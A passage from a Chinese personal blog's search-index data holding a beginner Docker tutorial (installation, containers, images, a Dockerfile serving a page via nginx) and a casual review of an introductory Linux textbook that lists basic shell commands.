Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"安装 docker 更新软件包仓库 sudo apt update 如果更新的时候发生了 GPG 错误，可以参考官网的这个提示： Receiving a GPG error when running apt-get update? Your default umask may be incorrectly configured, preventing detection of the repository public key file. Try granting read permission for the Docker public key file before updating the package index: $ sudo chmod a+r /etc/apt/keyrings/docker.gpg $ sudo apt-get update 安装 Docker Engine 、 containerd 和 Docker Compose. sudo apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin 通过运行 hello-world 镜像来验证 docker 是否安装成功 sudo docker run hello-world ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:2:2","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"rpm 系列 其实说实话，这类发行版我个人不太喜欢，就拿 CentOS 为例吧，CentOS 7 以上的版本也是可以直接用 yum 安装的。 ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:3:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"设置仓库 一样是设置第三方仓库。 不过要先安装 yum-utils 才能用 yum-config-manager。 sudo yum install -y yum-utils 然后设置仓库 sudo yum-config-manager \\ --add-repo \\ https://download.docker.com/linux/centos/docker-ce.repo ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:3:1","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"安装 一样是使用 yum 命令来安装 docker 的软件包和依赖。 sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:3:2","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"对于 Linux 平台再提一嘴 上述的方法都是在 Linux 平台安装 docker 的最新版本，如果需要安装特定的版本，可以参考 docker 的官方文档进行操作。 ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:4:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"Windows 在 Windows 平台可以直接安装 docker-desktop，这也非常简单，直接通过 docker 官方文档下载安装包就行了。 我能怎么玩 docker？ docker 能干的事多着呢。 最常用的就是在 docker 容器里运行应用程序了。 ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:5:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"HelloWorld 比如我们来运行一个 Hello World sudo docker run ubuntu /bin/echo \"hello world\" 如图所见，它输出一系列字符后，在最后输出了 hello world 那么来解释一下命令的含义吧 docker – 运行 docker 的二进制文件, 这个没什么好说的 run – 运行容器 ubuntu – 要运行的镜像名称 /bin/echo \"hello world\" - 在容器里面要执行的命令 提示 如果出现了以下信息，可能是因为在启动容器的时候没有下载好相关的镜像 Unable to find image 'ubuntu:latest' locally latest: Pulling from library/ubuntu e96e057aae67: Pull complete 默认情况下 docker 会自动下载，但最好养成启动之前下载好镜像的习惯。 sudo docker pull ubuntu ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:6:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"交互式容器 当然,我们也可以创建一个可以交互的容器,意思就是可以用 bash 来控制它 sudo docker run -i -t ubuntu /bin/bash 参数含义 -i: 交互式操作。 -t: 终端。 引自菜鸟教程 这样我们创建容器之后,我们的 shell 也变成了容器里的 shell 我们可以对它进行一些操作命令,随便打几个吧. 而且我们执行的命令是不会影响到主系统的 然后我们可以使用 exit 命令来退出这个系统. 这样一来容器的操作系统就退出了,同时容器也停止运行了, 因为这个容器不是以 daemon 模式来运行的. ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:7:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"以 daemon 模式来运行容器 接下来我要说的是,为啥上文中用 exit 退出容器 shell 之后还不算完. 这次我们再打开一个容器,不过这次加一个参数 -d 这个参数的意思是以 Daemon 模式运行, 那么 Daemon 是什么意思呢? 通过搜索引擎得到的答案往往是什么 系统守护进程巴拉巴拉的,其实它类似于后台运行的意思. 接下来我们用这个命令来开个容器 sudo docker run -i -t -d ubuntu /bin/bash 这时我们发现,我们并没有得一个 shell, 而是得到来一串字符串. 我们试试用 docker 的 ps 命令来查看一下正在运行的容器: sudo docker ps 我们得到来这样的结果 图片可能不太清楚? 这里还是贴出来吧 [weepingdogel@WeepingDogel-Arch ~]$ sudo docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 2f4976200305 ubuntu \"/bin/bash\" About a minute ago Up About a minute funny_pare 然后发现了返回的结果中容器 ID 只有上面返回字符串的前面一部分,这个往往是我们会用的容器 ID 要怎样才能控制它的 shell 呢? 又要接触新的 docker 命令了 attach exec exec 需要加上 -i 和 -t 参数以及命令,比如 /bin/bash . 所以执行格式是这样的 sudo docker exec -it 容器ID 命令 然后我们需要执行 bash sudo docker exec -it 2f4976200305 /bin/bash 很快,我们就进入了容器的 shell. 我们可以用 cat /etc/os-release 来查看系统信息. 我们可以很清晰的看到,上面返回的是 Ubuntu 而我用的是 Arch, 因此我们可以确定容器里的东西不会影响到操作系统. 什么?不清晰?那再看清楚一点吧 PRETTY_NAME=\"Ubuntu 22.04.1 LTS\" NAME=\"Ubuntu\" VERSION_ID=\"22.04\" VERSION=\"22.04.1 LTS (Jammy Jellyfish)\" VERSION_CODENAME=jammy ID=ubuntu ID_LIKE=debian HOME_URL=\"https://www.ubuntu.com/\" SUPPORT_URL=\"https://help.ubuntu.com/\" BUG_REPORT_URL=\"https://bugs.launchpad.net/ubuntu/\" PRIVACY_POLICY_URL=\"https://www.ubuntu.com/legal/terms-and-policies/privacy-policy\" UBUNTU_CODENAME=jammy 退出还是一样的可以用 exit , 但是此时的 exit 只是退出这个 bash, 它并不会关闭容器. 执行 docker ps 我们可以看到它还在运行. 那么我们接下来试试 attach 它的用法是 sudo docker attach 容器ID 所以我需要执行 sudo docker attach 2f4976200305 这样一来我们也可以得到一个shell,但是如果我们执行了 exit, 这个容器是会被停止的. 来试试看? 很明显,当 exit 被执行之后用 docker ps 命令看不到正在运行的容器ID,这说明容器被停止了. 如果需要再次启动这个容器呢,我们可以使用 start 或者 restart 命令来重启. sudo docker restart 2f4976200305 此时我们用 docker ps 就又能看到它在运行了 提示 使用 docker ps -a命令可以查看所有的容器,无论是否正在运行 sudo docker ps -a ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:8:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"删除容器 如果这些容器不需要了怎么办, 比如玩坏了,要把它删掉 那就要用 docker rm 命令 sudo docker rm 容器ID 后面接上容器 ID 就能删除, 可以删除多个 sudo docker rm 6c8c8d9f5540 6c49bc1fdc49 eb71e810ee50 5a84d067d769 2addaf3666ef 然后在用 docker ps -a 来查看, 就看不到任何容器 ID 了 ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:9:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"镜像 docker 容器运行的前提条件是它需要相应的镜像. 可以用 docker images 来查看本地已经有的镜像, 如果需要的别的镜像可以用 docker pull 来获取 sudo docker images 我们来获取 php 的镜像 sudo docker pull php 等待他们自动下载完成,镜像就可以用了. 如果你运行容器的时候没有事先拉取镜像的话, docker 则会在运行容器的时候临时进行拉取. 下载进程完成之后, 我们查看一下现有的镜像 sudo docker images REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest a8780b506fa4 7 days ago 77.8MB php latest 30e567f030d3 12 days ago 484MB httpd latest fe8735c23ec5 2 weeks ago 145MB 各个选项说明: REPOSITORY：表示镜像的仓库源 TAG：镜像的标签 IMAGE ID：镜像ID CREATED：镜像创建时间 SIZE：镜像大小 同一仓库源可以有多个 TAG，代表这个仓库源的不同个版本，如 ubuntu 仓库源里，有 15.10、14.04 等多个不同的版本，我们使用 REPOSITORY:TAG 来定义不同的镜像。 引自菜鸟教程 ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:10:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"删除镜像 当然, 不需要的镜像也是可以删除的. sudo docker rmi 镜像ID 如图,这样就把不需要的镜像删除了 ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:11:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"dockerfile 啥是 dockerfile? Dockerfile 是用来构建镜像文件的文本文件, 文件里面包含的是一条条指令和说明, 和一些 shell 脚本类似(比如 PKGBUILD ) 而一个简单的 Dockerfile 是长这样的 FROM nginx RUN echo 'Hello World!' \u003e /usr/share/nginx/html/index.html 来自菜鸟教程的提示 FROM 定制的镜像都是基于 FROM 的镜像, 这里的 nginx 就是定制需要的基础镜像。后续的操作都是基于 nginx。 RUN 用于执行后面跟着的命令行命令。有以下俩种格式： shell 格式： RUN \u003c命令行命令\u003e # \u003c命令行命令\u003e 等同于，在终端操作的 shell 命令。 exec 格式: RUN [\"可执行文件\", \"参数1\", \"参数2\"] # 例如： # RUN [\"./test.php\", \"dev\", \"offline\"] 等价于 RUN ./test.php dev offline 熟悉 Linux 操作的话, 上手这玩意也就很简单了, 但是值得注意的是菜鸟教程当中说的这一段: 注意 Dockerfile 的指令每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大。例如： FROM centos RUN yum -y install wget RUN wget -O redis.tar.gz \"http://download.redis.io/releases/redis-5.0.3.tar.gz\" RUN tar -xvf redis.tar.gz 以上执行会创建 3 层镜像。可简化为以下格式： FROM centos RUN yum -y install wget \\ \u0026\u0026 wget -O redis.tar.gz \"http://download.redis.io/releases/redis-5.0.3.tar.gz\" \\ \u0026\u0026 tar -xvf redis.tar.gz 也就是说我们要尽量在 RUN 当中写命令脚本的时候尽量写并列语句. ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:12:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"一个简单的 Web 服务器. 现在我想试试用 docker 来跑一个简单的网页了. 就跑一下我之前闲着没事干写的登录页面吧. 首先我们要创建一个目录 mkdir webtest 先把前端的静态文件复制进去 cp test/* webtest/ -rv 然后进入该目录 cd webtest 检查一下文件 ls -lh 总计 4.0K drwxr-xr-x 2 weepingdogel weepingdogel 23 11月10日 21:30 css drwxr-xr-x 2 weepingdogel weepingdogel 6 11月10日 21:30 img -rw-r--r-- 1 weepingdogel weepingdogel 1.4K 11月10日 21:30 index.html drwxr-xr-x 2 weepingdogel weepingdogel 21 11月10日 21:30 js ok ,现在我们来写一个 dockerfile FROM nginx COPY ./index.html /usr/share/nginx/html/index.html COPY ./css/style.css /usr/share/nginx/html/css/style.css COPY ./js/main.js /usr/share/nginx/html/js/main.js 指令详解 COPY 复制指令，从上下文目录中复制文件或者目录到容器里指定路径。 格式： COPY [--chown=\u003cuser\u003e:\u003cgroup\u003e] \u003c源路径1\u003e... \u003c目标路径\u003e COPY [--chown=\u003cuser\u003e:\u003cgroup\u003e] [\"\u003c源路径1\u003e\",... \"\u003c目标路径\u003e\"] [--chown=\u003cuser\u003e:\u003cgroup\u003e]：可选参数，用户改变复制到容器内文件的拥有者和属组。 \u003c源路径\u003e：源文件或者源目录，这里可以是通配符表达式，其通配符规则要满足 Go 的 filepath.Match 规则。例如： COPY hom* /mydir/ COPY hom?.txt /mydir/ \u003c目标路径\u003e：容器内的指定路径，该路径不用事先建好，路径不存在的话，会自动创建。 我的思路和正常的搭建方式一样,安装 nginx 之后再把写好的静态文件复制到web根目录就行, 但是用 docker 的效率高很多. 但是如果不用 docker 的话, 我至少要多花半个小时的时间去配置一个虚拟机, 配置软件源 安装 nginx 什么的, 花的时间就更多了, 而现在我只需要写一个脚本就能一键部署, 而且还能保存为镜像分享给别人,一劳永逸~ 好了, 话不多说, 开始构建镜像 使用 docker build 命令通过目录下的 dockerfile 文件构建一个镜像, -t 的属性值是指 \u003c镜像名称:镜像标签\u003e sudo docker build -t webtest:latest . 注意了, 我在最后面还加了一个 . , 这个叫做上写文路径, 也是指相对路径 什么叫上下文路径? 上下文路径，是指 docker 在构建镜像，有时候想要使用到本机的文件（比如复制），docker build 命令得知这个路径后，会将路径下的所有内容打包。 然后我们查看一下镜像列表 sudo docker images 很明显,我们可以看到我们刚刚创建的镜像, 镜像 ID 是 9acd8c30bd5b. 那么接下来把它部署到容器里~ 用 -p 来指定端口绑定 \u003c外部端口:内部端口\u003e sudo docker run -p 8080:80 -d 9acd8c30bd5b 现在我们已经把容器的 80 端口映射到了宿主机的 8080 端口~ 然后访问我们的本地 IP + 8080 就可以访问到那个页面了, 我这里用 127.0.0.1:8080 访问 成功访问! 这样一来,快速部署 nginx 就完成了! 结语 经过对 docker 初学习和初体验, 我也浅尝到了它的高效率和便捷性, 收获还是比较多的. 但目前还是一个入门的阶段,更多高级应用方法还等着去探索~ 诶? 你问我难不难? QwQ ~ 对 Linux 熟悉的人来玩这个没几天应该就能玩会了, 不过要做到深入的了解还是需要时间的. 那 就这样吧 ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:13:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":null,"content":"一本值得吐槽的书。","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"序 多日不见，甚是想念。 这段时间开学了，忙了一阵， 好久没更新博客了。 教科书当中看到了这么一本书（上图），叫做《Linux网络操作系统应用基础教程》。第一眼感觉封面挺好看的，这种简约配色显得这本书有高级感…然而，翻了几页看了，发现这是一本基础书籍。 对于一个用了两年 Arch 又不喜欢看书的人来说，这本书里的内容学起来应该会很快吧。 抱着试试看的态度，我想一天肝完这本书。 全书目录 首先来看一下目录， 差点笑出声。 很明显，这确实是一些基础内容。其中很大部分在两年 Arch 使用经验中也接触过。 看起来都是一些概念+基础+实践操作 概念内容 大概是项目一到项目二的 2.1 的内容，讲了 Linux 的案例、历史、以及流行的发行版。 书中居然没有 Arch, 差评。 但是也描述了 Linux 可以用来运行各种服务，比如 DNS（Domain Name System）服务、Web 服务器（Apache Nginx 这些提供基于HTTP协议的网页服务的）、基于 SMTP 协议的邮件服务器、以及 FTP 协议的文件传输服务器、基于 Samba 协议的文件共享服务器、DHCP 服务器 还有 VPN 服务器。 总之就是讲了 Linux 能干啥、Linux 的优点等， 这些可以通过搜索引擎查到，不多赘述。 实操性内容 往后都是一些操作性的内容，比如 Linux 的安装和搭建各种服务等 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:0:0","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"安装 Linux 操作系统 书中讲用 VMware 装一个 CentOS 虚拟机。 高中的时候就会了，跳过。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:1:0","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"Linux 基础操作 关于基础操作方面，我在初中的时候就写过一丢丢基础命令的笔记 书里也介绍了两种打开终端的方式，一个是在图形界面打开终端，另一种是按 Ctrl + Alt + (F1 ~F6) 来切换 tty。 然后是命令，大部分是加了 -h 参数以后的中文翻译，对于英语不太好的人来说，需要的时候翻阅一下也是一件美事。 另外我需要补充一些初中发的那篇文章当中没有写到的一些命令。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:2:0","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"cat 输出一个文件的内容，书中写的用法是 cat [选项] [文件名] 但我们一般的用法是 cat [文件名] 这个没什么好说的，也是常用的，但是遇到太长的文本就不太好了。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:2:1","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"less 和 more 我几乎没见过有人用 more， 命令的使用方式都是一样的，但是效果可能不同吧。 more [选项] [文件名] less [选项] [文件名] 一般来说我们都不加什么选项的… ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:2:2","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"head 和 tail 这个也没啥好说的，参数用法都一样，不过前者看头后者看屁股。 head [option] [文件名] tail [option] [文件名] 参数选项 -n num 显示指定文件的末尾 num 行 -c num 显示指定文件的末尾 num 个字符。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:2:3","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"rmdir 用来删除目录，用这个的话，删除的目录必须是空的。 否则会报错，和 mkdir 一样，可以加 -p 来进行递归删除。 递归是什么意思？就是一级一级往下删。 rmdir [option] [文件名] 然而我平时不喜欢用这个，我喜欢用 rm -r 或者 rm -rfv 。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:2:4","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"touch touch 命令可以生成一个普通文件。 touch [文件名] ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:2:5","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"grep 这个用来查看文件中包含指定字符串的行，常用。 grep [选项] [要查找的字符串] [文件名] ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:2:6","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"tar 这个 tar 我平时就用来解压。 tar xvf [文件名] 然而这是个打包命令， 相当于压缩文档。 tar [选项] [档案文件] [文件列表] -c 生成档案文件 -v 列出归档文件解档的详细过程 -f 指定档案文件名称 -r 将文件追加到档案文件末尾 -z 以 gzip 格式压缩或解压 -j 以 bzip2 格式压缩或解压 -d 比较档案与当前目录中的文件 -x 解开档案文件 可以用 man 来查看 tar 的更多信息。 man tar ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:2:7","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"rpm rpm 系发行版的离线软件包安装器。至少我是这么理解的。 rpm [选项] [软件包名字] 这个软件包名字是指一个文件名哦， 一些 .rpm 后缀结尾的文件，就是 rpm 系的软件包。 安装好像是这样的 rpm -i [软件包名字] 其他的参数 -v 安装过程显示详细信息 -h 安装过程中显示#号进度条 -e 删除软件包 -q 查看软件包是否已经安装 也可以通过 man 来阅读手册 man rpm 现在都是直接用 yum 或者 dnf 这种包管理器了，使用远程仓库来安装和管理软件包。 ","date":"2022-09-30","objectID":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/:2:8","tags":["吐槽","Linux","基础","速成向"],"title":"一天刷完《Linux网络操作系统应用基础教程》这本书","uri":"/zh-cn/posts/%E4%B8%80%E5%A4%A9%E5%88%B7%E5%AE%8Clinux%E7%BD%91%E7%BB%9C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%BA%94%E7%94%A8%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B%E8%BF%99%E6%9C%AC%E4%B9%A6/"},{"categories":null,"content":"文档编辑 至于文档编辑，就需要用 vi 或者 vim。 这个也是常有的事 vim [文件名] 引用一个菜鸟教程的链接吧 我平常就用个 i 来编辑文档， ESC 来退出编辑模式， :w 保存， :q 来退出。 有时候要加个 ! 强制执行。 保存退出是 :wq 如果有其他需求我会用 man 来看文档。 man vim 